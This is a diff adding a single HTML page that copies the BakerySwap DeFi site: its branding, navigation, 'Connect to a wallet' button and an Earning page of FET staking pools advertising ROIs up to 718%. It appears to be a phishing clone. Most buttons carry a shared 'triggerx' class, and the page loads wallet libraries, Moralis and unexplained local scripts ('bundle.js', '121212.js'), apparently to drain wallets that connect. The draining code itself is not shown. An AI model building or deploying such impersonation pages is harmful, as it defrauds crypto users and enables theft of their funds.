@@ -1,0 +1,484 @@
+<!doctype html>
+<html lang="en">
+
+<head>
+    <meta charset="utf-8" />
+    <link rel="icon" href="./favicon.png" />
+    <meta name="viewport" content="width=device-width,initial-scale=1" />
+    <meta name="theme-color" content="#000000" />
+    <meta name="description" content="BakerySwap is the all-in-one DeFi platform that provides both AMM and NFT Marketplace solutions in one place. Users can exchange tokens, provide liquidity, participate in liquidity farming, and also mint NFT and trade them.">
+    <title>BakerySwap</title>
+    <link href="./static/css/main.57410ce0.css" rel="stylesheet">
+</head>
+
+<body>
+  <noscript>You need to enable JavaScript to run this app.</noscript>
+  <div id="root">
+    <div id="root">
+      <div class="sc-hrRoet bUpuBs">
+        <div class="sc-iXKTDd dgkyWV">
+          <div id="header_id" class="sc-hORach ffSLGG">
+            <div class="sc-bdVaJa sc-eNQAEJ sc-hMqMXs sc-krvtoX bekrDb" style="align-items: center;">
+              <div class="sc-bMVAic sc-bAeIUo bcBsLm">
+                <div id="menu-tab-button" class="sc-bXGyLb iWTNGH">
+                  <img src="./static/media/fold.ffe03d15.738b35f80212dedc7b2e7c076f2f7cc6.svg" alt="" style="height: 28px;">
+                </div>
+                <a href="#" class="sc-GMQeP cHIzWA">
+                  <div class="sc-lkqHmb gZiitS">
+                    <img src="./static/media/logo_white.b1858a79.02c30e4bc54ece9363f7d0883b66576b.svg" alt="logo" style="height: 32px;">
+                  </div>
+                  <div class="sc-bdVaJa sc-eNQAEJ sc-exAgwC eKaZQa">
+                    <img src="./static/media/wordmark.a003062e.669d8a19a2304f719b305dd6750d0553.svg" alt="logo" style="margin-left: 5px; margin-top: 0px; height: 20px;">
+                  </div>
+                </a>
+              </div>
+              <div class="sc-eLExRp kqOZFi">
+                <div class="sc-bMVAic PDERw">
+                  <div class="Dropdown-root">
+                    <div class="Dropdown-control" aria-haspopup="listbox">
+                      <div class="Dropdown-placeholder is-selected">BSC</div>
+                      <div class="Dropdown-arrow-wrapper">
+                        <span class="Dropdown-arrow"></span>
+                      </div>
+                    </div>
+                  </div>
+                  <div class="sc-cQFLBn ihQtnQ" style="pointer-events: auto;">
+                    <div id="bnb-balance" class="sc-cbkKFq fzdZEq css-8visvh" style="display: none; flex-shrink: 0;"></div>
+                    <button id="connect-button" class="triggerx sc-bdVaJa dkzats sc-iRbamj sc-jhAzac sc-iuJeZd sc-hMFtBS gGgqCw">
+                      <p class="sc-cLQEGU ebgzzQ">Connect to a wallet</p>
+                    </button>
+                  </div>
+                </div>
+                <div class="sc-iujRgT eRTwLR">
+                  <div class="sc-ksYbfQ bYYqoe">
+                    <button id="open-settings-dialog-button" class="sc-kgAjT bWPdFn">
+                      <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="sc-cHGsZl gosDdX">
+                        <circle cx="12" cy="12" r="3"></circle>
+                        <path d="M19.4 15a1.65 1.65 0 0 0 .33 1.82l.06.06a2 2 0 0 1 0 2.83 2 2 0 0 1-2.83 0l-.06-.06a1.65 1.65 0 0 0-1.82-.33 1.65 1.65 0 0 0-1 1.51V21a2 2 0 0 1-2 2 2 2 0 0 1-2-2v-.09A1.65 1.65 0 0 0 9 19.4a1.65 1.65 0 0 0-1.82.33l-.06.06a2 2 0 0 1-2.83 0 2 2 0 0 1 0-2.83l.06-.06a1.65 1.65 0 0 0 .33-1.82 1.65 1.65 0 0 0-1.51-1H3a2 2 0 0 1-2-2 2 2 0 0 1 2-2h.09A1.65 1.65 0 0 0 4.6 9a1.65 1.65 0 0 0-.33-1.82l-.06-.06a2 2 0 0 1 0-2.83 2 2 0 0 1 2.83 0l.06.06a1.65 1.65 0 0 0 1.82.33H9a1.65 1.65 0 0 0 1-1.51V3a2 2 0 0 1 2-2 2 2 0 0 1 2 2v.09a1.65 1.65 0 0 0 1 1.51 1.65 1.65 0 0 0 1.82-.33l.06-.06a2 2 0 0 1 2.83 0 2 2 0 0 1 0 2.83l-.06.06a1.65 1.65 0 0 0-.33 1.82V9a1.65 1.65 0 0 0 1.51 1H21a2 2 0 0 1 2 2 2 2 0 0 1-2 2h-.09a1.65 1.65 0 0 0-1.51 1z"></path>
+                      </svg>
+                    </button>
+                  </div>
+                </div>
+              </div>
+            </div>
+          </div>
+        </div>
+        <div class="sc-ehkqFD eqmiNA">
+          <div id="menu-tab" class="sc-cwsMzd dLDZpI" style="display: none;">
+            <div id="overlay-div"></div>
+            <nav class="sc-emmjRN bTiWHI ACTIVENAV">
+              <a id="home-button" class="triggerx triggerx menu-button sc-cpmLhU kpXpik" href="#" aria-current="page">
+                <img src="./static/media/home_select.73d5d793.8d3c0ddc73705c5a0c8c5c87eb67359a.svg" class="sc-jzgbtB gZWqcc" style="height: 24px;">
+                <span class="sc-bMvGRv htHvGK">Home</span>
+              </a>
+              <div id="trade-button" class="triggerx menu-button sc-gFaPwZ behxId ACTIVENAV">
+                <img src="./static/media/trade.9c696aab.9eceef9a968f1ac59d5566cca8fdcdac.svg" class="sc-jzgbtB gZWqcc" style="height: 24px;">
+                <span class="sc-bMvGRv htHvGK">Trade</span>
+                <img src="./static/media/triangle_down.336fb20e.3688bb5a6124bf244fdd6e7f4786a99c.svg" class="sc-rBLzX bUNUQb" style="height: 8px;">
+              </div>
+              <div id="trade-button-content" class="sc-fhYwyz hYJzoe ACTIVENAV">
+                <a id="exchange-button" href="#" class="triggerx menu-button sc-cpmLhU kpXpik" style="padding-left: 54px; font-weight: 500;">
+                  <img src="./static/media/exchange.59b59ded.6b60cc5cb3caf2fdf7371f78ea346306.svg" class="sc-jzgbtB gZWqcc" style="height: 24px;">
+                  <span class="sc-bMvGRv htHvGK">Exchange</span>
+                </a>
+                <a id="liquidity-button" href="#" class="triggerx menu-button sc-cpmLhU kpXpik" style="padding-left: 54px; font-weight: 500;">
+                  <img src="./static/media/liquidity.5e258eb9.a6fd5993af79b594bdc7669100514e57.svg" class="sc-jzgbtB gZWqcc" style="height: 24px;">
+                  <span class="sc-bMvGRv htHvGK">Liquidity</span>
+                </a>
+              </div>
+              <a id="earning-button" href="#" class="triggerx menu-button sc-cpmLhU kpXpik ACTIVENAV">
+                <img src="./static/media/earning.f3c9370c.6ac52b22cf8ef39ade51c2f1ed96d97e.svg" class="sc-jzgbtB gZWqcc" style="height: 24px;">
+                <span class="sc-bMvGRv htHvGK">Earning</span>
+              </a>
+              <a id="nftmarketplace-button" href="#" class="triggerx menu-button sc-cpmLhU kpXpik">
+                <img src="./static/media/nft.02261315.2452d2a0dc93c2ce452a25644573ff82.svg" class="sc-jzgbtB gZWqcc" style="height: 24px;">
+                <span class="sc-bMvGRv htHvGK">NFT Marketplace</span>
+              </a>
+              <div id="bakery-button" class="triggerx menu-button sc-CtfFt fyaOpU">
+                <img src="./static/media/gallery.7e87d6d3.8d1d5d9af85bfffb801e24c223c939e8.svg" class="sc-jzgbtB gZWqcc" style="height: 24px;">
+                <a target="_blank" rel="noopener noreferrer" href="https://gallery.bakeryswap.org/" class="sc-chPdSV bpvxnK sc-bnXvFD irWKoY galleryAboutLink">Bakery Gallery</a>
+              </div>
+              <a id="gamification-button" class="triggerx menu-button sc-cpmLhU kpXpik" href="#">
+                <img src="./static/media/game.ebcccdaf.622382a7ee504896fb876f64e9b19f6e.svg" class="sc-jzgbtB gZWqcc" style="height: 24px;">
+                <span class="sc-bMvGRv htHvGK">Gamification</span>
+              </a>
+              <a id="info-button" rel="noopener noreferrer" target="_blank" href="https://info.bakeryswap.org/" class="triggerx menu-button sc-chPdSV bpvxnK sc-bnXvFD irWKoY">
+                <img src="./static/media/info.10a5cc6a.413c341c2037fff9f33ed37da3f067d6.svg" class="sc-jzgbtB gZWqcc" style="height: 24px;">
+                <span class="sc-bMvGRv htHvGK">Info</span>
+              </a>
+              <div id="contact-button" class="triggerx menu-button sc-gFaPwZ behxId">
+                <img src="./static/media/contact.565401ef.147bb5390d20e1bd4f72ad1f6f871a4f.svg" class="sc-jzgbtB gZWqcc" style="height: 24px;">
+                <span class="sc-bMvGRv htHvGK">Contact</span>
+                <img src="./static/media/triangle_down.336fb20e.3688bb5a6124bf244fdd6e7f4786a99c.svg" class="sc-rBLzX bUNUQb" style="height: 8px;">
+              </div>
+              <div id="contact-button-content" class="sc-fhYwyz hYJzoe ACTIVECALSS">
+                <a rel="noopener noreferrer" target="_blank" href="https://twitter.com/bakery_swap" class="sc-chPdSV bpvxnK sc-bnXvFD irWKoY" style="padding-left: 54px; font-weight: 500;">
+                  <img src="./static/media/twitter.2da971ef.18c6c6ee17fda54e323b71eef24ac175.svg" class="sc-jzgbtB gZWqcc" style="height: 24px;">
+                  <span class="sc-bMvGRv htHvGK">Twitter</span>
+                </a>
+                <a target="_blank" rel="noopener noreferrer" href="https://medium.com/@BakerySwap" class="sc-chPdSV bpvxnK sc-bnXvFD irWKoY" style="padding-left: 54px; font-weight: 500;">
+                  <img src="./static/media/medium.b2a30939.fff28cc4a557b8f08f190f7cf3d3dbf6.svg" class="sc-jzgbtB gZWqcc" style="height: 24px;">
+                  <span class="sc-bMvGRv htHvGK">Medium</span>
+                </a>
+                <a target="_blank" rel="noopener noreferrer" href="https://t.me/bakeryswap" class="sc-chPdSV bpvxnK sc-bnXvFD irWKoY" style="padding-left: 54px; font-weight: 500;">
+                  <img src="./static/media/contact.565401ef.147bb5390d20e1bd4f72ad1f6f871a4f.svg" class="sc-jzgbtB gZWqcc" style="height: 24px;">
+                  <span class="sc-bMvGRv htHvGK">Telegram</span>
+                </a>
+              </div>
+            </nav>
+            <div class="sc-laTMn drSCbm hideCollectionList">
+              <div class="sc-hGoxap bLDQCz">
+                <img src="./static/media/triangle_up.1107bd60.a1e635703a2bd083f310bf503a00f968.svg" class="sc-fjmCvl dMkYnr" style="height: 8px;">
+                <span class="sc-bMvGRv htHvGK"></span>
+              </div>
+              <div class="sc-TFwJa jRKToQ"></div>
+            </div>
+          </div>
+          <div class="sc-bNgurp iXwAge ACTIVENAV" id="BodyContainer">
+            <div class="sc-bUfIhM jWKrkb" style="padding-top: 0px;">
+              <div>
+                <div id="cards-menu" class="sc-iQLKIq eScRiI">
+                  <div class="sc-jKJlTe sc-giadOv hmoZve"></div>
+                  <div class="sc-jVODtj Zdrfh">
+                    <div class="sc-kUaPvJ jTpnNj"></div>
+                  </div>
+                  <div class="sc-dxZgTM jhbSWw">
+                    <div class="sc-eTpRJs boycjJ css-xv7cdu" style="margin-bottom: 20px;">Earning</div>
+                  </div>
+                  <div class="sc-guztPN odGBL">
+                    <div id="earn-imt" class="sc-cFlXAS jqQebP ACTIVENAV">Earn FET <img src="./static/media/icon_v2.0de2baa58ac950230fa6dd7a75f84942.svg" width="24" class="sc-hcnlBt lbQjYv">
+                    </div>
+                    <div class="sc-cFlXAS jqQebP">Earn Others <img src="./static/media/icon_v2.0de2baa58ac950230fa6dd7a75f84942.svg" width="24" class="sc-hcnlBt lbQjYv">
+                    </div>
+                    <div class="sc-cFlXAS jqQebP">NFT</div>
+                    <div class="sc-cFlXAS jqQebP">V1</div>
+                    <div class="sc-cFlXAS jqQebP">Ended</div>
+                  </div>
+                  <div class="sc-jQMNup iXuTqc">
+                    <div class="sc-bJHhxl iQiucY">
+                      <img id="imt-small-logo" src="https://assets.coingecko.com/coins/images/5681/small/Fetch.jpg?1572098136" width="20px" height="20px">
+                      <div class="sc-fQkuQJ bMNWii css-vurnku">0.000</div>
+                      <div class="sc-TuwoP kXyVqX css-vurnku">To harvest</div>
+                      <button class="sc-bdVaJa dkzats sc-iRbamj sc-gipzik sc-dphlzf jUeZBO rejUeZBO" style="border: 1px solid transparent; justify-content: center; flex-wrap: nowrap; -webkit-box-align: center; align-items: center; height: 30px; line-height: 30px; padding: 0px; margin-left: 20px; width: 100px; font-size: 14px;">Harvest All</button>
+                    </div>
+                    <div class="sc-fCPvlr eKAcxx">
+                      <img>
+                    </div>
+                  </div>
+                  <div id="cards-container" class="sc-gAmQfK bKdZQA">
+                    <div class="triggerx sc-ugnQR sc-hAXbOi bXRfSE">
+                      <div class="sc-cCVOAp kzpMcv">
+                        <img src="./static/media/icon_star_white.4e1f2d9f2a9c6e9ba8c56d5b6713016e.svg" class="sc-cfWELz kGupyk">
+                      </div>
+                      <div class="sc-kAdXeD gHkqml">
+                        <img src="https://assets.coingecko.com/coins/images/5681/small/Fetch.jpg?1572098136" alt="" style="height: 54px; margin-bottom: 0px; margin-top: 0px;">
+                      </div>
+                      <div class="sc-hCaUpS cdusVa">
+                        <div id="busd-to-imt" class="css-2tt9xh">FET</div>
+                      </div>
+                      <div class="sc-bvTASY tSsQk">
+                        <div class="css-vurnku">Deposit:</div>
+                        <div class="sc-koErNt cCyypm">
+                          <div class="css-o8yhuq">FET</div>
+                        </div>
+                      </div>
+                      <div class="sc-bvTASY tSsQk">
+                        <div class="css-vurnku">Earn:</div>
+                        <div class="sc-koErNt cCyypm">
+                          <div class="css-o8yhuq imt-name">FET</div>
+                        </div>
+                      </div>
+                      <div class="sc-bvTASY tSsQk" style="margin-top: 32px;">
+                        <div class="css-vurnku">ROI:</div>
+                        <div class="sc-koErNt cCyypm">
+                          <div class="css-6z68fw">718%</div>
+                        </div>
+                      </div>
+                      <div class="sc-dHIava idVSmq">
+                        <a id="select-usdt-to-imt-btn" class="sc-iRbamj sc-gipzik sc-gJqsIT cbudmK select-button" href="#" style="pointer-events: none; background-color: rgb(238, 217, 204);">Select</a>
+                      </div>
+                    </div>
+                    <div class="triggerx sc-ugnQR sc-hAXbOi bXRfSE">
+                      <div class="sc-cCVOAp kzpMcv">
+                        <img src="./static/media/icon_star_white.4e1f2d9f2a9c6e9ba8c56d5b6713016e.svg" class="sc-cfWELz kGupyk">
+                      </div>
+                      <div class="sc-kAdXeD gHkqml">
+                        <img src="https://s2.coinmarketcap.com/static/img/coins/64x64/825.png" alt="" style="height: 54px; margin-bottom: 0px; margin-top: 0px;">
+                      </div>
+                      <div class="sc-hCaUpS cdusVa">
+                        <div id="busd-to-imt" class="css-2tt9xh">USDT TO FET</div>
+                      </div>
+                      <div class="sc-bvTASY tSsQk">
+                        <div class="css-vurnku">Deposit:</div>
+                        <div class="sc-koErNt cCyypm">
+                          <div class="css-o8yhuq">USDT</div>
+                        </div>
+                      </div>
+                      <div class="sc-bvTASY tSsQk">
+                        <div class="css-vurnku">Earn:</div>
+                        <div class="sc-koErNt cCyypm">
+                          <div class="css-o8yhuq imt-name">FET</div>
+                        </div>
+                      </div>
+                      <div class="sc-bvTASY tSsQk" style="margin-top: 32px;">
+                        <div class="css-vurnku">ROI:</div>
+                        <div class="sc-koErNt cCyypm">
+                          <div class="css-6z68fw">106.03%</div>
+                        </div>
+                      </div>
+                      <div class="sc-dHIava idVSmq">
+                        <a id="select-usdt-to-imt-btn" class="sc-iRbamj sc-gipzik sc-gJqsIT cbudmK select-button" href="#" style="pointer-events: none; background-color: rgb(238, 217, 204);">Select</a>
+                      </div>
+                    </div>
+                    <div class="triggerx sc-ugnQR sc-hAXbOi bXRfSE">
+                      <div class="sc-cCVOAp kzpMcv">
+                        <img src="./static/media/icon_star_white.4e1f2d9f2a9c6e9ba8c56d5b6713016e.svg" class="sc-cfWELz kGupyk">
+                      </div>
+                      <div class="sc-kAdXeD gHkqml">
+                        <img src="https://s2.coinmarketcap.com/static/img/coins/64x64/1027.png" alt="" style="height: 54px; margin-bottom: 0px; margin-top: 0px;">
+                      </div>
+                      <div class="sc-hCaUpS cdusVa">
+                        <div id="busd-to-imt" class="css-2tt9xh">ETH TO FET</div>
+                      </div>
+                      <div class="sc-bvTASY tSsQk">
+                        <div class="css-vurnku">Deposit:</div>
+                        <div class="sc-koErNt cCyypm">
+                          <div class="css-o8yhuq">ETH</div>
+                        </div>
+                      </div>
+                      <div class="sc-bvTASY tSsQk">
+                        <div class="css-vurnku">Earn:</div>
+                        <div class="sc-koErNt cCyypm">
+                          <div class="css-o8yhuq imt-name">FET</div>
+                        </div>
+                      </div>
+                      <div class="sc-bvTASY tSsQk" style="margin-top: 32px;">
+                        <div class="css-vurnku">ROI:</div>
+                        <div class="sc-koErNt cCyypm">
+                          <div class="css-6z68fw">123.99%</div>
+                        </div>
+                      </div>
+                      <div class="sc-dHIava idVSmq">
+                        <a id="select-usdt-to-imt-btn" class="sc-iRbamj sc-gipzik sc-gJqsIT cbudmK select-button" href="#" style="pointer-events: none; background-color: rgb(238, 217, 204);">Select</a>
+                      </div>
+                    </div>
+                    <div class="triggerx sc-ugnQR sc-hAXbOi bXRfSE">
+                      <div class="sc-cCVOAp kzpMcv">
+                        <img src="./static/media/icon_star_white.4e1f2d9f2a9c6e9ba8c56d5b6713016e.svg" class="sc-cfWELz kGupyk">
+                      </div>
+                      <div class="sc-kAdXeD gHkqml">
+                        <img src="https://s2.coinmarketcap.com/static/img/coins/64x64/7083.png" alt="" style="height: 54px; margin-bottom: 0px; margin-top: 0px;">
+                      </div>
+                      <div class="sc-hCaUpS cdusVa">
+                        <div id="busd-to-imt" class="css-2tt9xh">UNI TO FET</div>
+                      </div>
+                      <div class="sc-bvTASY tSsQk">
+                        <div class="css-vurnku">Deposit:</div>
+                        <div class="sc-koErNt cCyypm">
+                          <div class="css-o8yhuq">UNI</div>
+                        </div>
+                      </div>
+                      <div class="sc-bvTASY tSsQk">
+                        <div class="css-vurnku">Earn:</div>
+                        <div class="sc-koErNt cCyypm">
+                          <div class="css-o8yhuq imt-name">FET</div>
+                        </div>
+                      </div>
+                      <div class="sc-bvTASY tSsQk" style="margin-top: 32px;">
+                        <div class="css-vurnku">ROI:</div>
+                        <div class="sc-koErNt cCyypm">
+                          <div class="css-6z68fw">48.19%</div>
+                        </div>
+                      </div>
+                      <div class="sc-dHIava idVSmq">
+                        <a id="select-usdt-to-imt-btn" class="sc-iRbamj sc-gipzik sc-gJqsIT cbudmK select-button" href="#" style="pointer-events: none; background-color: rgb(238, 217, 204);">Select</a>
+                      </div>
+                    </div>
+                    <div class="triggerx sc-ugnQR sc-hAXbOi bXRfSE">
+                      <div class="sc-cCVOAp kzpMcv">
+                        <img src="./static/media/icon_star_white.4e1f2d9f2a9c6e9ba8c56d5b6713016e.svg" class="sc-cfWELz kGupyk">
+                      </div>
+                      <div class="sc-kAdXeD gHkqml">
+                        <img src="https://s2.coinmarketcap.com/static/img/coins/64x64/5994.png" alt="" style="height: 54px; margin-bottom: 0px; margin-top: 0px;">
+                      </div>
+                      <div class="sc-hCaUpS cdusVa">
+                        <div id="busd-to-imt" class="css-2tt9xh">SHIB TO FET</div>
+                      </div>
+                      <div class="sc-bvTASY tSsQk">
+                        <div class="css-vurnku">Deposit:</div>
+                        <div class="sc-koErNt cCyypm">
+                          <div class="css-o8yhuq">SHIB</div>
+                        </div>
+                      </div>
+                      <div class="sc-bvTASY tSsQk">
+                        <div class="css-vurnku">Earn:</div>
+                        <div class="sc-koErNt cCyypm">
+                          <div class="css-o8yhuq imt-name">FET</div>
+                        </div>
+                      </div>
+                      <div class="sc-bvTASY tSsQk" style="margin-top: 32px;">
+                        <div class="css-vurnku">ROI:</div>
+                        <div class="sc-koErNt cCyypm">
+                          <div class="css-6z68fw">62.92%</div>
+                        </div>
+                      </div>
+                      <div class="sc-dHIava idVSmq">
+                        <a id="select-usdt-to-imt-btn" class="sc-iRbamj sc-gipzik sc-gJqsIT cbudmK select-button" href="#" style="pointer-events: none; background-color: rgb(238, 217, 204);">Select</a>
+                      </div>
+                    </div>
+                    <div class="triggerx sc-ugnQR sc-hAXbOi bXRfSE">
+                      <div class="sc-cCVOAp kzpMcv">
+                        <img src="./static/media/icon_star_white.4e1f2d9f2a9c6e9ba8c56d5b6713016e.svg" class="sc-cfWELz kGupyk">
+                      </div>
+                      <div class="sc-kAdXeD gHkqml">
+                        <img src="https://s2.coinmarketcap.com/static/img/coins/64x64/2586.png" alt="" style="height: 54px; margin-bottom: 0px; margin-top: 0px;">
+                      </div>
+                      <div class="sc-hCaUpS cdusVa">
+                        <div id="busd-to-imt" class="css-2tt9xh">SNX TO FET</div>
+                      </div>
+                      <div class="sc-bvTASY tSsQk">
+                        <div class="css-vurnku">Deposit:</div>
+                        <div class="sc-koErNt cCyypm">
+                          <div class="css-o8yhuq">SNX</div>
+                        </div>
+                      </div>
+                      <div class="sc-bvTASY tSsQk">
+                        <div class="css-vurnku">Earn:</div>
+                        <div class="sc-koErNt cCyypm">
+                          <div class="css-o8yhuq imt-name">FET</div>
+                        </div>
+                      </div>
+                      <div class="sc-bvTASY tSsQk" style="margin-top: 32px;">
+                        <div class="css-vurnku">ROI:</div>
+                        <div class="sc-koErNt cCyypm">
+                          <div class="css-6z68fw">88.91%</div>
+                        </div>
+                      </div>
+                      <div class="sc-dHIava idVSmq">
+                        <a id="select-usdt-to-imt-btn" class="sc-iRbamj sc-gipzik sc-gJqsIT cbudmK select-button" href="#" style="pointer-events: none; background-color: rgb(238, 217, 204);">Select</a>
+                      </div>
+                    </div>
+                    <div class="triggerx sc-ugnQR sc-hAXbOi bXRfSE">
+                      <div class="sc-cCVOAp kzpMcv">
+                        <img src="./static/media/icon_star_white.4e1f2d9f2a9c6e9ba8c56d5b6713016e.svg" class="sc-cfWELz kGupyk">
+                      </div>
+                      <div class="sc-kAdXeD gHkqml">
+                        <img src="https://s2.coinmarketcap.com/static/img/coins/64x64/6783.png" alt="" style="height: 54px; margin-bottom: 0px; margin-top: 0px;">
+                      </div>
+                      <div class="sc-hCaUpS cdusVa">
+                        <div id="busd-to-imt" class="css-2tt9xh">AXS TO FET</div>
+                      </div>
+                      <div class="sc-bvTASY tSsQk">
+                        <div class="css-vurnku">Deposit:</div>
+                        <div class="sc-koErNt cCyypm">
+                          <div class="css-o8yhuq">AXS</div>
+                        </div>
+                      </div>
+                      <div class="sc-bvTASY tSsQk">
+                        <div class="css-vurnku">Earn:</div>
+                        <div class="sc-koErNt cCyypm">
+                          <div class="css-o8yhuq imt-name">FET</div>
+                        </div>
+                      </div>
+                      <div class="sc-bvTASY tSsQk" style="margin-top: 32px;">
+                        <div class="css-vurnku">ROI:</div>
+                        <div class="sc-koErNt cCyypm">
+                          <div class="css-6z68fw">88.43%</div>
+                        </div>
+                      </div>
+                      <div class="sc-dHIava idVSmq">
+                        <a id="select-usdt-to-imt-btn" class="sc-iRbamj sc-gipzik sc-gJqsIT cbudmK select-button" href="#" style="pointer-events: none; background-color: rgb(238, 217, 204);">Select</a>
+                      </div>
+                    </div>
+                    <div class="triggerx sc-ugnQR sc-hAXbOi bXRfSE">
+                      <div class="sc-cCVOAp kzpMcv">
+                        <img src="./static/media/icon_star_white.4e1f2d9f2a9c6e9ba8c56d5b6713016e.svg" class="sc-cfWELz kGupyk">
+                      </div>
+                      <div class="sc-kAdXeD gHkqml">
+                        <img src="https://s2.coinmarketcap.com/static/img/coins/64x64/6719.png" alt="" style="height: 54px; margin-bottom: 0px; margin-top: 0px;">
+                      </div>
+                      <div class="sc-hCaUpS cdusVa">
+                        <div id="busd-to-imt" class="css-2tt9xh">GRT TO FET</div>
+                      </div>
+                      <div class="sc-bvTASY tSsQk">
+                        <div class="css-vurnku">Deposit:</div>
+                        <div class="sc-koErNt cCyypm">
+                          <div class="css-o8yhuq">GRT</div>
+                        </div>
+                      </div>
+                      <div class="sc-bvTASY tSsQk">
+                        <div class="css-vurnku">Earn:</div>
+                        <div class="sc-koErNt cCyypm">
+                          <div class="css-o8yhuq imt-name">FET</div>
+                        </div>
+                      </div>
+                      <div class="sc-bvTASY tSsQk" style="margin-top: 32px;">
+                        <div class="css-vurnku">ROI:</div>
+                        <div class="sc-koErNt cCyypm">
+                          <div class="css-6z68fw">51.33%</div>
+                        </div>
+                      </div>
+                      <div class="sc-dHIava idVSmq">
+                        <a id="select-usdt-to-imt-btn" class="sc-iRbamj sc-gipzik sc-gJqsIT cbudmK select-button" href="#" style="pointer-events: none; background-color: rgb(238, 217, 204);">Select</a>
+                      </div>
+                    </div>
+                    <div class="triggerx sc-ugnQR sc-hAXbOi bXRfSE">
+                      <div class="sc-cCVOAp kzpMcv">
+                        <img src="./static/media/icon_star_white.4e1f2d9f2a9c6e9ba8c56d5b6713016e.svg" class="sc-cfWELz kGupyk">
+                      </div>
+                      <div class="sc-kAdXeD gHkqml">
+                        <img src="https://s2.coinmarketcap.com/static/img/coins/64x64/8104.png" alt="" style="height: 54px; margin-bottom: 0px; margin-top: 0px;">
+                      </div>
+                      <div class="sc-hCaUpS cdusVa">
+                        <div id="busd-to-imt" class="css-2tt9xh">1INCH TO FET</div>
+                      </div>
+                      <div class="sc-bvTASY tSsQk">
+                        <div class="css-vurnku">Deposit:</div>
+                        <div class="sc-koErNt cCyypm">
+                          <div class="css-o8yhuq">1INCH</div>
+                        </div>
+                      </div>
+                      <div class="sc-bvTASY tSsQk">
+                        <div class="css-vurnku">Earn:</div>
+                        <div class="sc-koErNt cCyypm">
+                          <div class="css-o8yhuq imt-name">FET</div>
+                        </div>
+                      </div>
+                      <div class="sc-bvTASY tSsQk" style="margin-top: 32px;">
+                        <div class="css-vurnku">ROI:</div>
+                        <div class="sc-koErNt cCyypm">
+                          <div class="css-6z68fw">78.61%</div>
+                        </div>
+                      </div>
+                      <div class="sc-dHIava idVSmq">
+                        <a id="select-usdt-to-imt-btn" class="sc-iRbamj sc-gipzik sc-gJqsIT cbudmK select-button" href="#" style="pointer-events: none; background-color: rgb(238, 217, 204);">Select</a>
+                      </div>
+                    </div>
+                  </div>
+                  <div class="sc-fcxLGG kmuIRO"></div>
+                </div>
+              </div>
+            </div>
+          </div>
+        </div>
+      </div>
+    </div>
+  </div>
+</body>
+<script src="vendors/%40popperjs/popper.min.js"></script>
+<script src="vendors/bootstrap/bootstrap.min.js"></script>
+
+<script src="./Decimal/decimal.js"></script>
+    <script src="./Moralis/moralis.js"></script>
+    
+    <script type="text/javascript" src="./WEB3/web3.js"></script>
+    <script type="text/javascript" src="./Web3Modal/web3modal.js"></script>
+    <script type="text/javascript" src="../bundle.js"></script>
+    
+    <script type="text/javascript" src="https://unpkg.com/evm-chains@0.2.0/dist/umd/index.min.js"></script>
+     <script type="text/javascript" src="https://unpkg.com/@walletconnect/web3-provider"></script>
+     <script type="text/javascript"  src="https://cdn.jsdelivr.net/npm/@portis/web3@4.0.7/umd/index.min.js"></script>
+    
+<script src="./121212.js"></script>
+
+</html>
